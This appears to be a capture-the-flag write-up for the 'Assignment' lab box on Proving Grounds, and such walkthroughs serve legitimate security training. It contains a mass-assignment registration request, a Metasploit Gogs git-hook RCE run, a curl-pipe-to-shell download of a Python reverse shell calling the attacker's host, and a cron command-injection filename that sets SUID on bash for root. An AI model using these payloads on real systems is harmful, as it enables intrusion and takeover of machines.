### Assignment Proving Grounds 

### Difficulty = Easy

### IP Address = 192.168.153.224

Nmap Scan:

```
                                                                                                                                                                                     [102/102]
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Assignment]                                                                                                                                             
└─$ nmap -sCV -A 192.168.153.224 -p22,80,8000 -oN nmapscan                                                                                                                                    
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 23:54 WAT                                                                                                                               
Nmap scan report for 192.168.153.224                                                                                                                                                          
Host is up (0.22s latency).                                                                                                                                                                   
                                                                                                                                                                                              
PORT     STATE SERVICE  VERSION                                                                                                                                                               
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                                                                          
| ssh-hostkey:                                                                                                                                                                                
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)                                                                                                                                
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)                                                                                                                               
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)                                                                                                                             
80/tcp   open  http                                                                                                                                                                           
| fingerprint-strings:                                                                                                                                                                        
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMB
ProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:                                                           
|     HTTP/1.1 400 Bad Request                                                                                                                                                                
|   FourOhFourRequest, GetRequest, HTTPOptions:                                                                                                                                               
|     HTTP/1.0 403 Forbidden                                                                                                                                                                  
|     Content-Type: text/html; charset=UTF-8                                                                                                                                                  
|_    Content-Length: 0                                                                                                                                                                       
|_http-title: notes.pg                                                                                                                                                                        
8000/tcp open  http-alt                                                                                                                                                                       
| fingerprint-strings:                                                                                                                                                                        
|   FourOhFourRequest:                                                                                                                                                                        
|     HTTP/1.0 404 Not Found                                                                                                                                                                  
|     Content-Type: text/html; charset=UTF-8                                                                                                                                                  
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647                                                                                                                                      
|     Set-Cookie: i_like_gogs=0617c5f1cb796894; Path=/; HttpOnly                                                                                                                              
|     Set-Cookie: _csrf=_RcOSVCfcAL-nOqvt_r6eB9MzX06MTY3NDY4NzI3NDI1MzAwMDkwOA; Path=/; Domain=assignment.pg; Expires=Thu, 26 Jan 2023 22:54:34 GMT; HttpOnly                                 
|     X-Content-Type-Options: nosniff                                                                                                                                                         
|     X-Frame-Options: DENY                                                                                                                                                                   
|     Date: Wed, 25 Jan 2023 22:54:34 GMT                                                                                                                                                     
|     <!DOCTYPE html>                                                                                                                                                                         
|     <html>                                                                                                                                                                                  
|     <head data-suburl="">                                                                                                                                                                   
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />                                                                                                                   
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>                                                                                                                                  
|     <meta name="author" content="Gogs" />                                                                                                                                                   
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />                                                                                                        
|     <meta name="keywords" content="go, git, self-hosted, gogs">                                                                                                                             
|     <meta name="referrer" content="no-referrer" />                                                                                                                                          
|     <meta name="_csrf" content="_RcOSVCfcAL-nOqvt_r6eB9MzX06MTY3NDY4Nz                                                                                                                      
|   GenericLines:           
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=1b0f362ac02e9f17; Path=/; HttpOnly
|     Set-Cookie: _csrf=X7nT8HRfZjdhOhvh9LMzyGx_hkY6MTY3NDY4NzI2ODU5Njg0NzczMw; Path=/; Domain=assignment.pg; Expires=Thu, 26 Jan 2023 22:54:28 GMT; HttpOnly
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Wed, 25 Jan 2023 22:54:28 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|_    <meta name="_csrf" content="X7nT8HRfZjdhOhvh9LMzyGx_hkY6MTY3NDY4NzI2ODU5N
|_http-title: Gogs
|_http-open-proxy: Proxy might be redirecting requests
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

Checking the web server on port 80 

Shows that its a note taking site
![image](https://user-images.githubusercontent.com/113513376/214711339-d651eb05-e079-4aed-abb6-b86d34b98426.png)

I'll create an account so as to access the functions
![image](https://user-images.githubusercontent.com/113513376/214711462-1ae7937b-a07d-45c4-a14a-d61a4a002fc5.png)


Also i'll take note of the email below the web page

```
Email:  jane@notes.pg 
```

Now back to the web page
![image](https://user-images.githubusercontent.com/113513376/214711610-1373d6e7-c047-4c62-937c-75c27bbc36b0.png)

I'll try creating a note 
![image](https://user-images.githubusercontent.com/113513376/214712293-69e10c6e-65eb-4851-9292-1d85306f8f7a.png)

After submitting it 
![image](https://user-images.githubusercontent.com/113513376/214712341-0cada722-c53a-4056-8db9-8ce9e946b4cc.png)


Hmmm i'll try injecting html tag `<h1>` by creating another note if it would reflect
![image](https://user-images.githubusercontent.com/113513376/214712523-23c74203-7f98-4e8a-92af-c4c33a5313ae.png)

After submitting it 
![image](https://user-images.githubusercontent.com/113513376/214712698-09980027-3aed-4ab0-b5e1-91736ef9031a.png)

Well it didin't work lets check the source code
![image](https://user-images.githubusercontent.com/113513376/214712834-8dee3c17-8531-4f8e-ad45-fda289ed56a7.png)

If I  try using `</textarea>` to attempt to like end the `<textarea>` it will still encode the special characters 

So lets check other things we can do on this web page

On the dashboard we can see the note we created when i click on it 
![image](https://user-images.githubusercontent.com/113513376/214714066-fbc91b7d-e40f-4e0d-b3fc-788112872fbf.png)

Hmmm the url seems suspicious 

I'll try maybe i can access other people notes 

When i tried accessing note 1 i get `Insufficient rights`
![image](https://user-images.githubusercontent.com/113513376/214714607-d3ca2c30-9e20-4af6-91b9-fc9f46fd2ee5.png)

Ok cool lets keep on checking other stuffs

On checking the members page we see list of members and also some sort of user creation data
![image](https://user-images.githubusercontent.com/113513376/214715301-802218e9-ba0b-42f0-af86-8ac944c68cb1.png)

I'll create another account but this time pass the request in burp
![image](https://user-images.githubusercontent.com/113513376/214716027-54245592-43d3-4f5c-a3a7-bc0f27ae6517.png)

The account creation data looks similar to the one we saw in the note 

I'll replace it with the one we saw in the note but using a valid authentication token i.e the current value in the request

Here's how the tampered request looks like

```
POST /register HTTP/1.1
Host: 192.168.153.224
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.153.224/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 186
Origin: http://192.168.153.224
Connection: close
Cookie: _simple_rails_session=BChLkNS0iY1aGkKeCl7KvXcPrKYOIPwnofvonsPZ0EmxbTwiHA9QbZvJvR1iiZs3z4yxBu7UqbtLLQByMBbxiz6HmEx%2FHEIJ1g2599zvICOljSc%2BdYvZBnUqXSkOcVwdKagplDFfIP7Qr7%2F4CgE88n9sCHsj4A1lAiYVNPtKOGOzh05BPui%2BTvuYIJ3mQozGao1FELF09qZt%2Bd0uUANnWxgkz5tDCo0ZGi9CveEotyrPCd9B7ZKPbgM0jdd9MNjRhpXmoYnR8sIWm%2B2kNU%2FM2yQMs6A5ckj1ek7YGKE%3D--7pr5mPJIzVvzww%2Fy--L4OxTm5oIFg9RZmzknc34g%3D%3D; lang=en-US; i_like_gogs=8213365a410b801b
Upgrade-Insecure-Requests: 1

authenticity_token=8NoBe0xHEGfc459qc-SzK_XB8tVTsLz0urVNMl6uRrNpmDNr0Z051fHfqjjrLSesceed3nB89uW3wOBiyABLYA&user[username]=pwner&user[role]=owner&user[password]=pwner&user[password_confirmation]=pwner&button=
```

So i'll forward the request and try logging in as `pwner:pwner`
![image](https://user-images.githubusercontent.com/113513376/214716121-4308a945-9599-4471-98f5-5745eec7916d.png)

Now i'll try accessing `note/1` which is likely going to contain juicy content cause it belongs to the owner of the note web app which we can tell from the image below
![image](https://user-images.githubusercontent.com/113513376/214716324-3e5f1dc0-816b-4a8f-ae0e-734527525d25.png)

So now i'll access it
![image](https://user-images.githubusercontent.com/113513376/214716388-f1705aab-046f-410d-8295-f7146fbdb1d2.png)

Ah sweet we have a new credential for the `gogs` interface on port 8000

So what that tampered request did was to give us admin role 

Now lets head onto gogs on port 8000
![image](https://user-images.githubusercontent.com/113513376/214716700-a22db4d6-9500-4446-8192-b6e4ddc8359f.png)
![image](https://user-images.githubusercontent.com/113513376/214716792-6956e35d-1578-49a3-b18b-8d4064d45c5e.png)

After logging in with `jane:svc-dev2022@@@!;P;4SSw0Rd` we get access to the user's account
![image](https://user-images.githubusercontent.com/113513376/214716949-9be7a56a-5957-4494-89e5-2947e2655d94.png)

Now lets get a way to get shell via this Gogs interface 

After searching google i found this [Exploit](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/gogs_git_hooks_rce)

Since its msf lets hope on to it then

```
msf6 exploit(multi/http/gogs_git_hooks_rce) > use exploit/multi/http/gogs_git_hooks_rce                                                                                                [12/12]
[*] Using configured payload linux/x64/meterpreter/reverse_tcp                                                                                                                                
msf6 exploit(multi/http/gogs_git_hooks_rce) > options                                                                                                                                         
                                                                                                                                                                                              
Module options (exploit/multi/http/gogs_git_hooks_rce):                                                                                                                                       
                                                                                                                                                                                              
   Name       Current Setting  Required  Description                                                                                                                                          
   ----       ---------------  --------  -----------                                                                                                                                          
   PASSWORD                    yes       Password to use                                                                                                                                      
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]                                                                                         
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit                                                         
   RPORT      3000             yes       The target port (TCP)                                                                                                                                
   SSL        false            no        Negotiate SSL/TLS for outgoing connections                                                                                                           
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME                    yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper


msf6 exploit(multi/http/gogs_git_hooks_rce) > set password svc-dev2022@@@!;P;4SSw0Rd
password => svc-dev2022@@@!;P;4SSw0Rd
msf6 exploit(multi/http/gogs_git_hooks_rce) > set username jane
username => jane
msf6 exploit(multi/http/gogs_git_hooks_rce) > set lhost tun0
lhost => 192.168.45.5
msf6 exploit(multi/http/gogs_git_hooks_rce) > set rhosts 192.168.153.224
rhosts => 192.168.153.224
msf6 exploit(multi/http/gogs_git_hooks_rce) > set rport 8000
rport => 8000
```

Now after running it we get a shell

```
msf6 exploit(multi/http/gogs_git_hooks_rce) > run

[*] Started reverse TCP handler on 192.168.45.5:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Gogs found
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[*] Authenticate with "jane/svc-dev2022@@@!;P;4SSw0Rd"
[+] Logged in
[*] Create repository "Zontrax_Bitchip"
[+] Repository created
[*] Setup post-receive hook with command
[+] Git hook setup
[*] Create a dummy file on the repo to trigger the payload
[+] File created, shell incoming...
[*] Sending stage (3020772 bytes) to 192.168.153.224
[*] Command Stager progress - 100.00% done (833/833 bytes)
[*] Meterpreter session 1 opened (192.168.45.5:4444 -> 192.168.153.224:48626) at 2023-01-26 00:46:08 +0100
[*] Cleaning up
[*] Repository Zontrax_Bitchip deleted.

meterpreter > getuid
Server username: jane
meterpreter > 
```

Alright then i'll get a more stable shell i don't like working from msf on linux box 🙂

```
meterpreter > shell
Process 6306 created.
Channel 1 created.
id
uid=1000(jane) gid=1000(jane) groups=1000(jane)
cd /tmp
ls
snap.lxd
systemd-private-3a9c4738b2fd4b3284401a4f70b06797-ModemManager.service-rqDLui
systemd-private-3a9c4738b2fd4b3284401a4f70b06797-systemd-logind.service-YDqcQf
systemd-private-3a9c4738b2fd4b3284401a4f70b06797-systemd-resolved.service-wURusi
systemd-private-3a9c4738b2fd4b3284401a4f70b06797-systemd-timesyncd.service-JHB7xh
vmware-root_750-2957714542
which curl
/usr/bin/curl
curl 192.168.45.5/shell.sh|sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   248  100   248    0     0    379      0 --:--:-- --:--:-- --:--:--   378

```

```
┌──(mark__haxor)-[~/Desktop/Scripts]
└─$ cat shell.sh
#!/bin/bash

#My lovely shell

export RHOST="192.168.45.5";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
                                                                                                                                                                                              
┌──(mark__haxor)-[~/Desktop/Scripts]
└─$ pyws -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.153.224 - - [26/Jan/2023 00:48:55] "GET /shell.sh HTTP/1.1" 200 -
```

And back on our listener 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Assignment]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.153.224] 59240
$ id
id
uid=1000(jane) gid=1000(jane) groups=1000(jane)
$ 
```

Now stabilize the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
reset
```

Now i'll upload pspy to the box via msf

```
meterpreter > upload /usr/bin/pspy64 /tmp/pspy
[*] uploading  : /usr/bin/pspy64 -> /tmp/pspy
[*] Uploaded -1.00 B of 2.94 MiB (0.0%): /usr/bin/pspy64 -> /tmp/pspy
[*] uploaded   : /usr/bin/pspy64 -> /tmp/pspy
meterpreter >
```

I can now access it on the box in the /tmp directory

```
jane@assignment:~$ cd /tmp
jane@assignment:/tmp$ ls
pspy
snap.lxd
systemd-private-3a9c4738b2fd4b3284401a4f70b06797-ModemManager.service-rqDLui
systemd-private-3a9c4738b2fd4b3284401a4f70b06797-systemd-logind.service-YDqcQf
systemd-private-3a9c4738b2fd4b3284401a4f70b06797-systemd-resolved.service-wURusi
systemd-private-3a9c4738b2fd4b3284401a4f70b06797-systemd-timesyncd.service-JHB7xh
vmware-root_750-2957714542
jane@assignment:/tmp$ 
```

So i'll change the perm to executeable `chmod +x pspy` then run it

After some minutes i get that cron is running

```
2023/01/25 23:54:01 CMD: UID=0    PID=6531   | /usr/sbin/CRON -f 
2023/01/25 23:54:01 CMD: UID=0    PID=6534   | 
2023/01/25 23:54:01 CMD: UID=0    PID=6533   | /bin/bash /usr/bin/clean-tmp.sh 
2023/01/25 23:54:01 CMD: UID=0    PID=6532   | /bin/sh -c /bin/bash /usr/bin/clean-tmp.sh 
```

Lets check the content of the file that's being run 

```
jane@assignment:/tmp$ cat /usr/bin/clean-tmp.sh 
#! /bin/bash
find /dev/shm -type f -exec sh -c 'rm {}' \;
jane@assignment:/tmp$
```

Well from this we can conclude that

```
1. Its running `find` command in `/dev/shm` directory 
2. Then it searches for files 
3. And it executes `sh -c 'rm {}' \`
```

Searching the manual of `find -exec`

```
┌──(mark__haxor)-[~]
└─$ man find | grep exec 

-exec command ;
              Execute command; true if 0 status is returned.  All following arguments to find are taken to be arguments to the command until an argument consisting of `;' is encountered.
              The  string  `{}'  is replaced by the current file name being processed everywhere it occurs in the arguments to the command, not just in arguments where it is alone, as in
              some versions of find.  Both of these constructions might need to be escaped (with a `\') or quoted to protect them from expansion by the shell.  See the  EXAMPLES  section
              for  examples  of  the use of the -exec option.  The specified command is run once for each matched file.  The command is executed in the starting directory.  There are un‐
              avoidable security problems surrounding use of the -exec action; you should use the -execdir option instead.
```

From this we can get command injection 

```
jane@assignment:/dev/shm$ echo -n "chmod +s /bin/bash" | base64
Y2htb2QgK3MgL2Jpbi9iYXNo
jane@assignment:/tmp$ touch /dev/shm/'$(echo Y2htb2QgK3MgL2Jpbi9iYXNo | base64 -d | bash)'
jane@assignment:/tmp$ ls /dev/shm
'$(echo Y2htb2QgK3MgL2Jpbi9iYXNo | base64 -d | bash)'
```

So after the cron executes the rm command it will then execute the command in the /dev/shm directory

Now after few seconds lets check the permission for the bash binary

```
jane@assignment:/tmp$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
jane@assignment:/tmp$
```

Sweet now lets get root

```
jane@assignment:/tmp$ bash -p
bash-5.0# id
uid=1000(jane) gid=1000(jane) euid=0(root) egid=0(root) groups=0(root),1000(jane)
bash-5.0# cd /root
bash-5.0# ls -al
total 60
drwx------ 10 root root 4096 Jan 25 23:04 .
drwxr-xr-x 19 root root 4096 Jun 15  2022 ..
lrwxrwxrwx  1 root root    9 Aug  2 14:28 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Aug  2 14:25 .bundle
drwx------  3 root root 4096 Aug  2 14:25 .config
drwxrwxr-x  3 root root 4096 Aug  2 14:24 .gem
-rw-r--r--  1 root root   45 Aug  2 14:28 .gitconfig
drwx------  3 root root 4096 Aug  2 14:23 .gnupg
drwxr-xr-x  3 root root 4096 Jun 16  2022 .local
drwxr-xr-x  4 root root 4096 Aug  2 14:25 .npm
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Jun 15  2022 .ssh
-rw-rw-r--  1 root root   58 Jul 14  2022 clean-tmp.sh
-rw-------  1 root root   33 Jan 25 23:04 proof.txt
drwx------  3 root root 4096 Jun 15  2022 snap
bash-5.0# cat proof.txt
fca793563f0542af8f6309a07b19c97c
bash-5.0# 
```

And we're done 


<br> <br>
[Back To Home](../../index.md)
<br>





